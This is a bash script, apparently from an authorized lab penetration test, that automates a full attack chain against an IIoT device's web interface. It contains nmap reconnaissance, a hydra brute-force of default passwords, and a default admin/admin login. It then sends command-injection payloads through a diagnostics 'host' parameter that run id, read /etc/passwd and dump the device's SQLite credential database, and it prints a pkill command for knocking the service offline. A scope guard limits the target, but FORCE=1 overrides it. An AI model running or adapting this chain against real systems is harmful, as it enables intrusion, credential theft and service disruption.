#!/usr/bin/env bash
# Reproduce the intended attack chain against the lab device ONLY.
#
# Scope guard: refuses any target other than 192.168.100.90 unless FORCE=1.
# Usage: ./scripts/attack-iot.sh [--yes]
set -uo pipefail

TARGET="${TARGET:-192.168.100.90}"
PORT="${PORT:-8080}"
BASE="http://${TARGET}:${PORT}"
OUT_DIR="${OUT_DIR:-logs/phase-iot-2026-11-06/attack}"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
ASSUME_YES=0
[[ "${1:-}" == "--yes" || "${1:-}" == "-y" ]] && ASSUME_YES=1

if [[ "$TARGET" != "192.168.100.90" && "${FORCE:-0}" != "1" ]]; then
  echo "refusing target $TARGET (scope is 192.168.100.90). Set FORCE=1 to override." >&2
  exit 2
fi

mkdir -p "$OUT_DIR"
JAR="$OUT_DIR/cookies-${STAMP}.txt"

cat <<EOF
== IIoT baseline attack chain ==
 target : $BASE
 output : $OUT_DIR
 NOTE   : authorized lab only; no persistence, no other hosts.
EOF

if [[ $ASSUME_YES -eq 0 ]]; then
  read -r -p "Continue? [y/N] " answer
  [[ "$answer" =~ ^[Yy]$ ]] || exit 0
fi

echo "[1/5] recon (nmap)"
nmap -sV -Pn -p "$PORT" -oN "$OUT_DIR/nmap-${STAMP}.txt" "$TARGET" || true

echo "[2/5] fingerprint / headers"
curl -sS -D "$OUT_DIR/headers-root-${STAMP}.txt" -o /dev/null "$BASE/" || true
curl -sS "$BASE/health" | tee "$OUT_DIR/health-${STAMP}.json" || true

echo "[3/5] default credentials"
WORDLIST="$(mktemp)"
trap 'rm -f "$WORDLIST"' EXIT
printf '%s\n' admin operator password admin123 operator123 123456 raspberry > "$WORDLIST"
hydra -l admin -P "$WORDLIST" -s "$PORT" -f -o "$OUT_DIR/hydra-${STAMP}.txt" "$TARGET" http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Username atau password salah' || true

echo "[4/5] authenticated access (default admin/admin)"
curl -sS -c "$JAR" -o /dev/null \
  -d 'username=admin&password=admin' "$BASE/login" || true

if ! grep -q 'session' "$JAR" 2>/dev/null; then
  echo "login failed; stopping" >&2
  exit 1
fi

echo "[5/5] command injection (V1) evidence"
for payload in "127.0.0.1;id" "127.0.0.1;uname -a" "127.0.0.1;cat /etc/passwd"; do
  echo "--- payload: $payload"
  curl -sS --max-time 15 -b "$JAR" -G --data-urlencode "host=$payload" \
    "$BASE/api/diagnostics" | tee -a "$OUT_DIR/injection-${STAMP}.txt"
done

echo "--- dump credentials from SQLite via injection (V1 -> DB)"
curl -sS --max-time 20 -b "$JAR" -G \
  --data-urlencode 'host=127.0.0.1;sqlite3 /var/lib/iot-device/iot.db .dump' \
  "$BASE/api/diagnostics" > "$OUT_DIR/db-dump-${STAMP}.sql" || true
echo "saved: $OUT_DIR/db-dump-${STAMP}.sql"

echo "[*] optional availability test (not run automatically):"
echo "    curl -b $JAR -G --data-urlencode 'host=127.0.0.1;pkill -f app.py' $BASE/api/diagnostics"
echo "    (systemd restarts the service; demonstrates availability risk)"
echo "== done: $OUT_DIR =="
